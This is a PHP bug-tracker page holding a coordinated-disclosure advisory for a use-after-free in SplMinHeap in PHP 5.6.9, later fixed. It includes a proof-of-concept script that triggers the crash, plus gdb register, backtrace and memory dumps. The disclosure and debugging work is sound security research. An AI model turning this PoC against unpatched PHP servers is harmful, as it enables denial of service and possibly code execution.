<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='Reproducible crash Bug #69737 - RDF' href='rss/bug.php?id=69737'>
        <link rel='alternate' type='application/rss+xml' title='Reproducible crash Bug #69737 - RSS 2.0' href='rss/bug.php?id=69737&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Bug #69737 :: Segfault when SplMinHeap::compare produces fatal error</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=69737">Bug</a>&nbsp;#69737</th>
            <td id="summary" colspan="5">Segfault when SplMinHeap::compare produces fatal error</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2015-06-01 05:57 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2015-06-02 05:04 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>stas@php.net</td>
            <th class="details">Assigned:</th>
            <td></td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=Reproducible+crash">Reproducible crash</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.4Git-2015-06-01 (Git)</td>
            <th class="details">OS:</th>
            <td>*</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><em>None</em></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=69737&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=69737&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=69737&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1433138223">&nbsp;</a><strong>[2015-06-01 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Description:
------------
High-Tech Bridge Security Research Lab has discovered a security vulnerability in your product - PHP.

Detailed description and all available details of the vulnerability is provided below in the email.

Please notify us by replying to this email when you release a security update, and provide us if possible with URL of patch/solution so we can add this URL to the advisory.

If you need more time to fix the vulnerability - please specify desired Public Disclosure date by replying to this email.

For any questions related to this notification email - please visit our General Information &amp; Disclosure Policy page: <a href="https://www.htbridge.com/advisory/disclosure_policy.html" rel="nofollow">https://www.htbridge.com/advisory/disclosure_policy.html</a>

If you don't find an answer to your question there - please feel free to contact us by email: advisory@htbridge.com

===============================================================

Advisory ID: HTB23262
Reference: <a href="https://www.htbridge.com/advisory/HTB23262" rel="nofollow">https://www.htbridge.com/advisory/HTB23262</a>
Product: PHP 
Vendor: PHP Group
Vulnerable Version(s): 5.6.9 and probably prior
Tested Version: 5.6.9
Public Disclosure: June 10, 2015 
Vulnerability Type: Use After Free [CWE-416]
Risk Level: Medium 
CVSSv2 Base Score: 4.6 (AV:L/AC:L/Au:N/C:P/I:P/A:P)
Discovered and Provided: High-Tech Bridge Security Research Lab ( <a href="https://www.htbridge.com/advisory/" rel="nofollow">https://www.htbridge.com/advisory/</a> ) 



Advisory Details:

High-Tech Bridge Security Research Lab discovered use-after-free vulnerability in a popular programming language PHP, which can be exploited to cause crash and possibly execute arbitrary code on the target system.

The vulnerability resides within the 'spl_heap_object_free_storage()' PHP function when trying to dereference already freed memory. A local attacker can cause segmentation fault or possibly execute arbitrary code on the target system with privileges of webserver. 

Below is a simple exploitation code:
&lt;?php
class SplMinHeap1 extends SplMinHeap {
  public function compare($a, $b) {
    return -parent::notexist($a, $b);
  }
}
$h = new SplMinHeap1();
$h-&gt;insert(1);
$h-&gt;insert(6);
$h-&gt;insert(5);
$h-&gt;insert(2); 
?&gt;
Running the following PoC we get:


gdb-peda$ r ~/Desktop/heap_uaf.php 
Starting program: /usr/local/bin/php ~/Desktop/heap_uaf.php
PHP Fatal error:  Call to undefined method SplMinHeap::notexist() in /home/test/Desktop/heap_uaf.php on line 4

Fatal error: Call to undefined method SplMinHeap::notexist() in /home/test/Desktop/heap_uaf.php on line 4

Program received signal SIGSEGV, Segmentation fault.
[--------------------------------------------------------------------------registers---------------------------------------------------------------------------]
RAX: 0x5a5a5a5a5a5a5a5a (ZZZZZZZZ)
RBX: 0x8000000 
RCX: 0xcd0458 (&quot;/home/test/De&quot;...)
RDX: 0x16f 
RSI: 0xcd0458 (&quot;/home/test/De&quot;...)
RDI: 0x5a5a5a5a5a5a5a5a (ZZZZZZZZ)
RBP: 0x7fffffffc570 --&gt; 0x7fffffffc5a0 --&gt; 0x7fffffffc5d0 --&gt; 0x7fffffffc600 --&gt; 0x7fffffffc630 --&gt; 0x7fffffffc750 --&gt; 0x7fffffffc850 --&gt; 0x7fffffffc9b0 --&gt; 0x7fffffffdcf0 --&gt; 0x7fffffffde50 --&gt; 0x0 
RSP: 0x7fffffffc570 --&gt; 0x7fffffffc5a0 --&gt; 0x7fffffffc5d0 --&gt; 0x7fffffffc600 --&gt; 0x7fffffffc630 --&gt; 0x7fffffffc750 --&gt; 0x7fffffffc850 --&gt; 0x7fffffffc9b0 --&gt; 0x7fffffffdcf0 --&gt; 0x7fffffffde50 --&gt; 0x0 
RIP: 0x82a96f (&lt;zval_delref_p+12&gt;:	mov    eax,DWORD PTR [rax+0x10])
R8 : 0x269 
R9 : 0x0 
R10: 0x7fffffff9b20 --&gt; 0x0 
R11: 0x7ffff71102f0 --&gt; 0xfffda6c0fffda3ef 
R12: 0x4209e0 (&lt;_start&gt;:	xor    ebp,ebp)
R13: 0x7fffffffdf30 --&gt; 0x2 
R14: 0x0 
R15: 0x0
[-----------------------------------------------------------------------------code-----------------------------------------------------------------------------]
   0x82a964 &lt;zval_delref_p+1&gt;:	mov    rbp,rsp
   0x82a967 &lt;zval_delref_p+4&gt;:	mov    QWORD PTR [rbp-0x8],rdi
   0x82a96b &lt;zval_delref_p+8&gt;:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x82a96f &lt;zval_delref_p+12&gt;:	mov    eax,DWORD PTR [rax+0x10]
   0x82a972 &lt;zval_delref_p+15&gt;:	lea    edx,[rax-0x1]
   0x82a975 &lt;zval_delref_p+18&gt;:	mov    rax,QWORD PTR [rbp-0x8]
   0x82a979 &lt;zval_delref_p+22&gt;:	mov    DWORD PTR [rax+0x10],edx
   0x82a97c &lt;zval_delref_p+25&gt;:	mov    rax,QWORD PTR [rbp-0x8]
[----------------------------------------------------------------------------stack-----------------------------------------------------------------------------]


As seen above when trying to dereference the value from $rax (which has been already freed) PHP crashes.


Stopped reason: SIGSEGV
0x000000000082a96f in zval_delref_p (pz=0x5a5a5a5a5a5a5a5a) at /home/test/Desktop/php-5.6.9/Zend/zend.h:411
411		return --pz-&gt;refcount__gc;

Running the backtrace command we can see a couple of freed variables: zval_ptr, pz
gdb-peda$ bt
#0  0x000000000082a96f in zval_delref_p (pz=0x5a5a5a5a5a5a5a5a) at /home/test/Desktop/php-5.6.9/Zend/zend.h:411
#1  0x000000000082aafb in i_zval_ptr_dtor (zval_ptr=0x5a5a5a5a5a5a5a5a, __zend_filename=0xcd0458 &quot;/home/test/De&quot;..., __zend_lineno=0x16f) at /home/test/Desktop/php-5.6.9/Zend/zend_execute.h:76
#2  0x000000000082bdcb in _zval_ptr_dtor (zval_ptr=0x7ffff7fcba88, __zend_filename=0xcd0458 &quot;/home/test/De&quot;..., __zend_lineno=0x16f) at /home/test/Desktop/php-5.6.9/Zend/zend_execute_API.c:424
#3  0x00000000006e5c1a in spl_heap_object_free_storage (object=0x7ffff7dfdfa0) at /home/test/Desktop/php-5.6.9/ext/spl/spl_heap.c:367
#4  0x000000000087f566 in zend_objects_store_free_object_storage (objects=0x102e640 &lt;executor_globals+928&gt;) at /home/test/Desktop/php-5.6.9/Zend/zend_objects_API.c:97
#5  0x000000000082b89e in shutdown_executor () at /home/test/Desktop/php-5.6.9/Zend/zend_execute_API.c:290
#6  0x0000000000841a4c in zend_deactivate () at /home/test/Desktop/php-5.6.9/Zend/zend.c:960
#7  0x00000000007a7c40 in php_request_shutdown (dummy=0x0) at /home/test/Desktop/php-5.6.9/main/main.c:1882
#8  0x00000000008f6501 in do_cli (argc=0x2, argv=0x1032560) at /home/test/Desktop/php-5.6.9/sapi/cli/php_cli.c:1177
#9  0x00000000008f6d8b in main (argc=0x2, argv=0x1032560) at /home/test/Desktop/php-5.6.9/sapi/cli/php_cli.c:1378
#10 0x00007ffff6faaec5 in __libc_start_main () from /lib/x86_64-linux-gnu/libc.so.6
#11 0x0000000000420a09 in _start ()


Lastly, from stack #2 we clearly see that the zval_ptr pointer (0x7ffff7fcba88) points to freed memory:


gdb-peda$ x/50xw 0x7ffff7fcba88
0x7ffff7fcba88:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcba98:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbaa8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbab8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbac8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbad8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbae8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbaf8:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbb08:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbb18:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbb28:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbb38:	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a	0x5a5a5a5a
0x7ffff7fcbb48:	0x5a5a5a5a	0x5a5a5a5a


This vulnerability was successfully reproduced Ubuntu 14.04.1 LTS (32 bit and 64 bit) on the latest version of PHP 5.6.9.

Test script:
---------------
&lt;?php
class SplMinHeap1 extends SplMinHeap {
  public function compare($a, $b) {
    return -parent::notexist($a, $b);
  }
}
$h = new SplMinHeap1();
$h-&gt;insert(1);
$h-&gt;insert(6);



</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=69737'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=69737'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1433221475">&nbsp;</a><strong>[2015-06-02 05:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type: Security</span>
<span class="added">+Type: Bug</span>
</div></div></div><div class='comment type_svn' ><a name="1433224537">&nbsp;</a><strong>[2015-06-02 05:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=1cbd25ca15383394ffa9ee8601c5de4c0f2f90e1" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=1cbd25ca15383394ffa9ee8601c5de4c0f2f90e1</a>
Log: Fix <a href='bug.php?id=69737'>bug #69737</a> - Segfault when SplMinHeap::compare produces fatal error
</pre>
</div><div class='comment type_log' ><a name="1433224537">&nbsp;</a><strong>[2015-06-02 05:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Open</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_related' ><a name="1433888730">&nbsp;</a><strong>[2015-06-09 22:25 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Related To: <a href='bug.php?id=69721'>Bug #69721</a>
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
